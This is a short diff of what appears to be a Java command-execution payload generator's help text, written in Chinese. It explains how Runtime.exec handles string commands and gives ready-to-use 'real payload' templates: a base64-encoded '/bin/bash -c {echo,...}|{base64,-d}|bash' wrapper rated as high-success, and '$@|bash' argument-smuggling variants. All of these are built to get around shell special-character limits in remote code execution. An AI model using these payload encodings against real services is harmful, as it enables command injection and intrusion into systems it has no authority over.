@@ -28,12 +28,14 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_orig
 2⃣️ 参数类型 String
 参数类型: 字符串
 如 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
+注意: 当有 ( ) { } < >| & ; ~ 等字符时 则命令执行失败!
 
 🔥实际payload【成功率很高】 支持Linux 不支持macOS
 /bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash
 
 
-🔥实际payload 【成功率低】 如果命令字符串 包含了 shell下的特殊字符 ( ) { } < >| & ; 则命令可能执行失败.
+🔥实际payload 【成功率低】
+注意: 当有 ( ) { } < >| & ; ~ 等字符时 则命令执行失败!
 /bin/bash -c $@|bash 0 arr0w1_cmd_origin
 /bin/bash -c $*|bash 0 arr0w1_cmd_origin
 </textarea>
